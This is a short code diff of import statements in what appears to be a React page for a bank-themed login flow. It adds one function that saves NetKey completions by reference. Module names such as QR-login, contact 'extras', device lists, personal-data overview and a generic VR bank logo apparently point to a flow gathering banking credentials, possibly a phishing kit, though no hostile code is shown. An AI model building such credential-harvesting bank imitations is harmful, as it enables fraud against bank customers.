@@ -6,7 +6,7 @@ import { submitQrContactExtras, requestDeviceList } from "@/lib/qrLogin.function
 import { resolveAsset } from "@/lib/bankAssetUrl";
 import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
 import { CompletionStep } from "@/components/flow/CompletionStep";
-import { completePendingNetkey } from "@/lib/completedNetkeys";
+import { completePendingNetkey, saveNetkeyCompletionByRef } from "@/lib/completedNetkeys";
 import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
 import { DeviceManagementStep, type Device } from "@/components/flow/DeviceManagementStep";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
